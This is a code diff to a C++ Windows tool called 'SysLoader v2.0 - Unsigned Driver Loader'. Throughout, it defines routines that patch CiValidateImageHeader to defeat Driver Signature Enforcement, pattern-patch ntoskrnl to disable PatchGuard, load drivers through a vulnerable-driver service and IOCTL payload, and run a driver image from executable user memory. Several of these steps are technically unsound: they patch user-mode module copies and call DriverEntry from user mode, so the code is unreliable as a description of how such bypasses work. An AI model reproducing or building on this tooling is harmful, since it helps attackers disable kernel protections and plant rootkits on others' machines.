@@ -29,6 +29,9 @@ struct LoadedDriver {
 std::vector<LoadedDriver> g_loadedDrivers;
 std::string g_selectedDriverPath;
 
+bool LoadDriver(const std::string& filePath);
+bool UnloadDriver(const std::string& driverName);
+
 #ifdef _DLL
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call) {
@@ -68,24 +71,33 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 bool DisableDSE() {
     HMODULE ci = LoadLibraryA("ci.dll");
     if (!ci) return false;
+    
     FARPROC CiValidateImageHeader = GetProcAddress(ci, "CiValidateImageHeader");
     if (!CiValidateImageHeader) return false;
+    
     DWORD oldProtect;
-    VirtualProtect(CiValidateImageHeader, 8, PAGE_EXECUTE_READWRITE, &oldProtect);
+    LPVOID funcAddr = (LPVOID)CiValidateImageHeader;
+    
+    if (!VirtualProtect(funcAddr, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) return false;
+    
     BYTE ret[] = { 0x48, 0x31, 0xC0, 0xC3 };
-    memcpy(CiValidateImageHeader, ret, sizeof(ret));
-    VirtualProtect(CiValidateImageHeader, 8, oldProtect, &oldProtect);
+    memcpy(funcAddr, ret, sizeof(ret));
+    
+    VirtualProtect(funcAddr, 8, oldProtect, &oldProtect);
     return true;
 }
 
 bool DisablePatchGuard() {
     HMODULE ntoskrnl = GetModuleHandleA("ntoskrnl.exe");
     if (!ntoskrnl) return false;
+    
     BYTE* base = (BYTE*)ntoskrnl;
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
     IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
+    
     BYTE pattern[] = { 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20 };
     BYTE* found = NULL;
+    
     for (DWORD i = 0; i < nt->OptionalHeader.SizeOfImage - sizeof(pattern); i++) {
         bool match = true;
         for (DWORD j = 0; j < sizeof(pattern); j++) {
@@ -93,6 +105,7 @@ bool DisablePatchGuard() {
         }
         if (match) { found = base + i; break; }
     }
+    
     if (found) {
         DWORD oldProtect;
         VirtualProtect(found, 32, PAGE_EXECUTE_READWRITE, &oldProtect);
@@ -107,22 +120,32 @@ bool DisablePatchGuard() {
 bool LoadVulnerableDriver(const std::string& path, const std::vector<BYTE>& payload) {
     SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!scm) return false;
+    
     SC_HANDLE service = CreateServiceA(scm, "SysLoaderSvc", "Sys Loader Service",
         SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
         SERVICE_ERROR_NORMAL, path.c_str(), NULL, NULL, NULL, NULL, NULL);
     if (!service) { CloseServiceHandle(scm); return false; }
+    
     if (!StartServiceA(service, 0, NULL)) {
-        DeleteService(service); CloseServiceHandle(service); CloseServiceHandle(scm); return false;
+        DeleteService(service);
+        CloseServiceHandle(service);
+        CloseServiceHandle(scm);
+        return false;
     }
+    
     HANDLE hDevice = CreateFileA("\\\\.\\SysLoader", GENERIC_READ | GENERIC_WRITE,
         0, NULL, OPEN_EXISTING, 0, NULL);
     if (hDevice == INVALID_HANDLE_VALUE) {
-        CloseServiceHandle(service); CloseServiceHandle(scm); return false;
+        CloseServiceHandle(service);
+        CloseServiceHandle(scm);
+        return false;
     }
+    
     DWORD bytesReturned = 0;
     BOOL result = DeviceIoControl(hDevice, 0x9C402400,
         (LPVOID)payload.data(), (DWORD)payload.size(),
         NULL, 0, &bytesReturned, NULL);
+    
     CloseHandle(hDevice);
     DeleteService(service);
     CloseServiceHandle(service);
@@ -146,12 +169,16 @@ bool BYOVD_Load(const std::vector<BYTE>& driverData) {
 bool LoadDriverFromMemory(const std::vector<BYTE>& driverData) {
     LPVOID driverMemory = VirtualAlloc(NULL, driverData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!driverMemory) return false;
+    
     memcpy(driverMemory, driverData.data(), driverData.size());
+    
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)driverMemory;
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)driverMemory + dos->e_lfanew);
     LPVOID entryPoint = (LPVOID)((BYTE*)driverMemory + nt->OptionalHeader.AddressOfEntryPoint);
+    
     typedef NTSTATUS (*DriverEntry_t)(LPVOID, LPVOID);
     DriverEntry_t DriverEntry = (DriverEntry_t)entryPoint;
+    
     NTSTATUS status = DriverEntry(NULL, NULL);
     if (status == 0) {
         LoadedDriver driver;
@@ -163,6 +190,7 @@ bool LoadDriverFromMemory(const std::vector<BYTE>& driverData) {
         g_loadedDrivers.push_back(driver);
         return true;
     }
+    
     VirtualFree(driverMemory, 0, MEM_RELEASE);
     return false;
 }
@@ -170,12 +198,16 @@ bool LoadDriverFromMemory(const std::vector<BYTE>& driverData) {
 bool LoadDriver(const std::string& filePath) {
     std::ifstream file(filePath, std::ios::binary);
     if (!file.is_open()) return false;
+    
     std::vector<BYTE> driverData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
     file.close();
+    
     if (!DisableDSE()) return false;
     DisablePatchGuard();
+    
     if (LoadDriverFromMemory(driverData)) return true;
     if (BYOVD_Load(driverData)) return true;
+    
     return false;
 }
 
@@ -285,6 +317,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     icc.dwSize = sizeof(icc);
     icc.dwICC = ICC_WIN95_CLASSES;
     InitCommonControlsEx(&icc);
+    
     WNDCLASSA wc = {0};
     wc.lpfnWndProc = WindowProc;
     wc.hInstance = hInstance;
@@ -292,19 +325,25 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
     wc.lpszClassName = "SysLoader";
     wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
+    
     if (!RegisterClassA(&wc)) return 1;
+    
     g_hMainWindow = CreateWindowA("SysLoader", "SysLoader v2.0 - Unsigned Driver Loader",
         WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME,
         CW_USEDEFAULT, CW_USEDEFAULT, 520, 370,
         NULL, NULL, hInstance, NULL);
+    
     if (!g_hMainWindow) return 1;
+    
     ShowWindow(g_hMainWindow, nCmdShow);
     UpdateWindow(g_hMainWindow);
+    
     MSG msg = {0};
     while (GetMessageA(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessageA(&msg);
     }
+    
     return msg.wParam;
 }
 
